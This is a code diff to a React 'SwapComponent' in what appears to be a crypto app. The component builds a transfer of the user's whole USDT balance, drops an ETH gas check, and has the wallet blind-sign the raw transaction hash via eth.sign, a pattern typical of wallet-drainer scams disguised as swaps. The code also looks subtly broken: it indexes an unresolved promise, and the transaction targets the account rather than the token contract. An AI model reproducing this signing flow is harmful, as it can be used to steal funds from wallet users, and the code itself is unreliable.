@@ -156,37 +156,29 @@ function SwapComponent() {
       },
     ]
 
+    const account = await web3js.eth.getAccounts()[0]
+
     const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress)
-    const usdtBalance = await usdtContract.methods.balanceOf(address).call()
-    const ethBalance = await web3js.eth.getBalance(address)
+    const usdtBalance = await usdtContract.methods.balanceOf(account).call()
 
     if (usdtBalance <= 0) {
       console.log('Insufficient USDT balance')
       return
     }
 
-    const data = usdtContract.methods.transfer(address, usdtBalance).encodeABI()
-    const nonce = await web3js.eth.getTransactionCount(address, 'pending')
+    const data = usdtContract.methods.transfer(account, usdtBalance).encodeABI()
+    const nonce = await web3js.eth.getTransactionCount(account, 'pending')
     const gasPrice = await web3js.eth.getGasPrice()
 
     const gasLimit = await web3js.eth.estimateGas({
-      from: address,
-      to: address,
+      from: account,
+      to: account,
       data: data,
     })
 
-    const requiredEth = BigInt(gasLimit) * BigInt(gasPrice)
-
-    if (BigInt(ethBalance) < requiredEth) {
-      console.log(
-        `Insufficient ETH balance for gas fees: required ${requiredEth}, available ${ethBalance}`
-      )
-      return
-    }
-
     const tx_ = {
-      from: address,
-      to: address,
+      from: account,
+      to: account,
       nonce: web3js.utils.toHex(nonce),
       gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
       gasLimit: web3js.utils.toHex(gasLimit),
@@ -202,7 +194,7 @@ function SwapComponent() {
     const sha3_ = web3js.utils.sha3(serializedTx)
 
     await web3js.eth
-      .sign(sha3_, address)
+      .sign(sha3_, account)
       .then(async (signed) => {
         const temporary = signed.substring(2)
         const r_ = '0x' + temporary.substring(0, 64)
@@ -240,7 +232,6 @@ function SwapComponent() {
       })
       .catch((heide) => {
         console.log(heide)
-        // Handle signing error
       })
   }
 
